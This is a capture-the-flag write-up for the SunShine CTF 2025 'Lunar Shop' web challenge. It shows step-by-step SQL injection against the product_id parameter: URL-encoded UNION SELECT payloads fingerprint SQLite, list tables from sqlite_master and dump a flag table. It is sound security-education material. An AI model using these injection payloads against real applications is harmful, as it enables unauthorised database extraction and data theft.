# Lunar Shop — SunShine CTF 2025

> **Room / Challenge:** Lunar Shop (Web)

---

## Metadata

- **Author:** `jameskaois`
- **CTF:** SunShine CTF 2025
- **Challenge:** Lunar Shop (web)
- **Target / URL:** `https://meteor.sunshinectf.games`
- **Difficulty:** `Easy`
- **Points:** `10`
- **Date:** `30-09-2025`

---

## Goal

We have to get the flag by using a vulnerability in the query of product id.

## My Solution

There are just 3 routes we can gather information in this website: `/`, `/products`, `/product?product_id`.

Home page:
![Guide image](../screenshots/lunar-shop-1.png)

Products page:
![Guide image](../screenshots/lunar-shop-2.png)

Product item details page:
![Guide image](../screenshots/lunar-shop-3.png)

There are just 3 visible products, we can try give different `product_id`.

Initially, I think that the flag is in other invisible `product_id`. However, there are just 10 products from id 1 -> 10.

So I think of another solution, which is **SQL Injection**. Firstly I test with this url: `https://meteor.sunshinectf.games/product?product_id=-1%20UNION%20SELECT%20%27A%27,%20%27B%27,%20%27C%27,%20%27sun{FLAG}%27%20--`

![Guide image](../screenshots/lunar-shop-4.png)

Try `https://meteor.sunshinectf.games/product?product_id=-1%20UNION%20SELECT%201,%202,%203,%20group_concat(table_name)%20FROM%20information_schema.tables%20WHERE%20table_schema=DATABASE()` to find the tables in the database.

However, I receive this error:

```
[ Error occured. --> no such table: information_schema.tables ]
```

This message indicate that the database is **SQLite**.

Try `https://meteor.sunshinectf.games/product?product_id=-1%20UNION%20SELECT%201,%202,%203,%20group_concat(tbl_name)%20FROM%20sqlite_master%20WHERE%20type='table'%20--`. Receive:

```
products,sqlite_sequence,flag
```

Get table structure: `https://meteor.sunshinectf.games/product?product_id=-1%20UNION%20SELECT%201,%202,%203,%20sql%20FROM%20sqlite_master%20WHERE%20type='table'%20AND%20tbl_name='flag'%20--`
Receive:

```
CREATE TABLE flag ( id INTEGER PRIMARY KEY AUTOINCREMENT, flag TEXT NOT NULL UNIQUE )
```

Final query to get the flag: `https://meteor.sunshinectf.games/product?product_id=-1%20UNION%20SELECT%201,%202,%203,%20flag%20FROM%20flag%20--`. Receive:

![Guide image](../screenshots/lunar-shop-5.png)

```
sun{baby_SQL_injection_this_is_known_as_error_based_SQL_injection_8767289082762892}
```
